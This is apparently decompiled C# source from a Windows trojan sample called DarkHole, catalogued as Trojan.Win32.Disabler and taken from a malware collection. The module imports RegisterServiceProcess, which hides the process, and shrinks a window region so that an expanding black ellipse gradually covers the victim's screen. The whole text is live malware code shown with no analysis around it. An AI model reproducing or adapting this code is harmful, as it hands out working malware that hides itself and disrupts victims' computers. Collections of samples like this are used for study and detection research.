// Decompiled with JetBrains decompiler
// Type: DarkHole.MainModule
// Assembly: DarkHole, Version=1.0.2863.37165, Culture=neutral, PublicKeyToken=null
// MVID: 004179F3-0653-4C47-86BC-65D9EC044824
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan.Win32.Disabler.ag-8f832a067f0cbed927d9eb2ca683e9473f989c4db136e10b5039182fc621175b.exe

using Microsoft.VisualBasic.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;

namespace DarkHole
{
  [StandardModule]
  internal sealed class MainModule
  {
    public static ADarkHole DarkHole;

    [DllImport("gdi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int CreateEllipticRgn(int X1, int Y1, int X2, int Y2);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int SetWindowRgn(int hWnd, int hRgn, bool bRedraw);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int RegisterServiceProcess(int dwProcessID, int dwType);

    public static void ProgressiveDarkHole()
    {
      while (MainModule.DarkHole.Elipse.Top > 0)
      {
        checked { --MainModule.DarkHole.Elipse.Top; }
        checked { --MainModule.DarkHole.Elipse.Left; }
        checked { ++MainModule.DarkHole.Elipse.Height; }
        checked { ++MainModule.DarkHole.Elipse.Width; }
        MainModule.DarkHole.DoDarkHole();
        Thread.Sleep(300);
      }
      MainModule.SetWindowRgn(MainModule.DarkHole.frmHole.Handle.ToInt32(), 0, true);
    }
  }
}
